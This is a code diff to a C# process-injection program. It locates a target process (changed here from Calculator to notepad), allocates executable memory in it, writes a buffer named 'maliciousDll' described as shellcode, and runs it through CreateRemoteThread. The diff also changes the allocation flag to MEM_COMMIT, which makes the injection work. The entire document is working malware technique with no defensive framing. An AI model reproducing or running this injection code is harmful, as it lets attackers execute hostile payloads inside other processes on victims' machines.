@@ -24,19 +24,19 @@ public class Program {
         return maliciousDll;
     }
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool CloseHandle(IntPtr hObject);
 
     public enum ProcessAccessRights
@@ -112,20 +112,20 @@ public class Program {
                 IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                 IntPtr lpThreadId = IntPtr.Zero;
 
-                Console.WriteLine("[+] Attempting to open process");
+
                 IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);
-                Console.WriteLine("[+] Getting the handle for the target process: " + procHandle);
-                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_RESERVE, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine("[+] Allocating memory in the remote process " + remoteAddr);
-                Console.WriteLine("[+] Writing shellcode at the allocated memory location.");
+                Console.WriteLine($"[+] Getting the handle for the target process: {procHandle}.");
+                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+                Console.WriteLine($"[+] Allocating memory in the remote process {remoteAddr}.");
+                Console.WriteLine($"[+] Writing shellcode at the allocated memory location.");
                 if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
                 {
-                    Console.WriteLine("[+] Shellcode written in the remote process.");
+                    Console.WriteLine($"[+] Shellcode written in the remote process.");
                     CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                 }
                 else
                 {
-                    Console.WriteLine("[+] Failed to inject shellcode.");
+                    Console.WriteLine($"[+] Failed to inject shellcode.");
                 }
 
             }
@@ -140,12 +140,9 @@ public class Program {
 
     public static void Main(string[] args) {
 
-        string targetProccess = "Calculator";
+        string targetProccess = "notepad";
         int targetProccessId = SearchForTargetID(targetProccess);
         ReflectiveDLLInject(targetProccessId, maliciousDll);
-
-        //byte[] bytes = Encoding.ASCII.GetBytes(someString);
-        
         
     }
 }
